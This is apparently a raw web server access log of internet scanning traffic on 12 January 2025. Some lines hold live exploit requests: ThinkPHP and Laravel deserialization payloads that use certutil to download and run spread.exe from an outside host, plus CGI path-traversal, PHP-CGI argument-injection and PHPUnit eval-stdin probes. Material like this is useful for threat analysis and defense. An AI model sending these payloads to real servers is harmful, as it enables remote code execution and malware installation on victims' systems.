185.242.226.10 - - [12/Jan/2025:12:06:40 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
5.181.190.248 - - [12/Jan/2025:12:09:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
165.154.202.146 - - [12/Jan/2025:12:15:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.169.6.196 - - [12/Jan/2025:12:20:40 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
118.200.118.85 - - [12/Jan/2025:12:24:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [12/Jan/2025:12:31:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:12:31:59 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:12:35:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:12:35:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
93.174.93.12 - - [12/Jan/2025:12:51:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/80.0.180 Chrome/74.0.3729.180 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:12:52:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:12:52:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
98.191.66.243 - - [12/Jan/2025:12:56:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
217.15.164.190 - - [12/Jan/2025:13:06:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
195.3.223.55 - - [12/Jan/2025:13:24:16 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.101.104 - - [12/Jan/2025:13:27:55 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
46.19.138.234 - - [12/Jan/2025:13:45:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.200.78.250 - - [12/Jan/2025:13:47:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.206.105.227 - - [12/Jan/2025:13:48:27 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"
93.174.93.12 - - [12/Jan/2025:13:50:42 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
78.153.140.93 - - [12/Jan/2025:13:57:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:13:57:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.224.3.5 - - [12/Jan/2025:14:00:48 +0000] "CONNECT api.ip.pn:443 HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.16.39.104 - - [12/Jan/2025:14:19:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.34.212.75 - - [12/Jan/2025:14:24:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [12/Jan/2025:14:58:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:14:58:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [12/Jan/2025:15:10:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [12/Jan/2025:15:19:53 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:15:19:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.10.168 - - [12/Jan/2025:15:25:09 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
193.200.78.250 - - [12/Jan/2025:15:46:25 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.149 - - [12/Jan/2025:15:51:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:15:51:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.34 - - [12/Jan/2025:15:59:02 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
210.179.48.163 - - [12/Jan/2025:16:01:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [12/Jan/2025:16:27:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:16:27:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:16:56:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:16:56:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
159.223.69.51 - - [12/Jan/2025:16:57:38 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [12/Jan/2025:16:57:47 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.247.210 - - [12/Jan/2025:17:06:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [12/Jan/2025:17:06:12 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.69.51 - - [12/Jan/2025:17:10:26 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [12/Jan/2025:17:10:35 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.67.34 - - [12/Jan/2025:17:11:16 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [12/Jan/2025:17:11:25 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
95.214.55.226 - - [12/Jan/2025:17:18:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [12/Jan/2025:17:30:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
175.213.111.76 - - [12/Jan/2025:17:33:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [12/Jan/2025:17:40:37 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
78.153.140.149 - - [12/Jan/2025:17:46:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:17:46:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.105.128.13 - - [12/Jan/2025:17:54:51 +0000] "\x16\x03\x01" 400 528 "-" "-"
78.153.140.93 - - [12/Jan/2025:18:01:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:18:01:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
73.220.251.65 - - [12/Jan/2025:18:04:52 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
154.213.184.23 - - [12/Jan/2025:18:16:10 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
103.203.56.3 - - [12/Jan/2025:18:23:55 +0000] "GET / HTTP/1.1" 200 1761 "-" "HTTP Banner Detection (https://security.ipip.net)"
220.87.110.51 - - [12/Jan/2025:18:30:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
18.220.122.122 - - [12/Jan/2025:18:47:20 +0000] "\x16\x03\x01" 400 528 "-" "-"
18.220.122.122 - - [12/Jan/2025:18:47:49 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
141.94.145.70 - - [12/Jan/2025:19:04:53 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5"
46.19.138.234 - - [12/Jan/2025:19:05:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [12/Jan/2025:19:23:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:19:23:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:19:35:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:19:35:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [12/Jan/2025:19:39:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
45.79.181.104 - - [12/Jan/2025:19:46:24 +0000] "\x16\x03\x01" 400 528 "-" "-"
105.156.27.19 - - [12/Jan/2025:20:05:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
105.156.27.19 - - [12/Jan/2025:20:05:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
82.55.24.75 - - [12/Jan/2025:20:16:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
27.25.154.176 - - [12/Jan/2025:20:32:35 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:40 +0000] "GET /index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:41 +0000] "GET /public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:50 +0000] "GET /index.php?s=index/\\think\\Container/invokeFunction&function=call_user_func_array&vars[]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:51 +0000] "GET /public/index.php?s=index/\\think\\Container/invokeFunction&function=call_user_func_array&vars[]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:51 +0000] "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:52 +0000] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:52 +0000] "GET /index.php?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:53 +0000] "GET /public/index.php?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:53 +0000] "POST /?s=captcha HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:53 +0000] "POST /user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 400 528 "-" "-"
27.25.154.176 - - [12/Jan/2025:20:32:54 +0000] "GET /public/index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:54 +0000] "GET /index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22cmd.exe+%2Fc+certutil+-urlcache+-split+-f+http%3A%2F%2F27.25.154.176%3A19490%2Fspread.txt+C%3A%5CProgramData%5Cspread.exe+%26%26+C%3A%5CProgramData%5Cspread.exe%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
27.25.154.176 - - [12/Jan/2025:20:32:54 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
181.49.205.58 - - [12/Jan/2025:20:37:21 +0000] "GET //libs/js/iframe.js HTTP/1.1" 302 387 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64"
78.153.140.149 - - [12/Jan/2025:20:48:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [12/Jan/2025:20:48:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:20:52:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:20:52:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
181.49.205.58 - - [12/Jan/2025:20:58:10 +0000] "GET //admin/config.php HTTP/1.1" 302 387 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64"
181.49.205.58 - - [12/Jan/2025:20:58:12 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.el7.x86_64"
60.191.125.35 - - [12/Jan/2025:21:04:38 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 296 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
193.34.212.75 - - [12/Jan/2025:21:28:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.120.127.198 - - [12/Jan/2025:21:31:08 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36 OPR/28.0.1750.40"
78.153.140.93 - - [12/Jan/2025:22:00:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:22:00:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [12/Jan/2025:22:01:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.168.34.221 - - [12/Jan/2025:22:15:25 +0000] "\x16\x03\x01" 400 528 "-" "-"
206.168.34.221 - - [12/Jan/2025:22:15:30 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [12/Jan/2025:22:15:32 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [12/Jan/2025:22:15:33 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [12/Jan/2025:22:15:34 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
45.148.10.242 - - [12/Jan/2025:22:16:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [12/Jan/2025:22:45:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [12/Jan/2025:22:45:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [12/Jan/2025:22:56:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
18.163.14.203 - - [12/Jan/2025:23:10:06 +0000] "\x16\x03\x01" 400 528 "-" "-"
18.163.14.203 - - [12/Jan/2025:23:10:46 +0000] "HEAD /actuator/env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
103.226.248.206 - - [12/Jan/2025:23:17:18 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:19 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:19 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:20 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:20 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:20 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
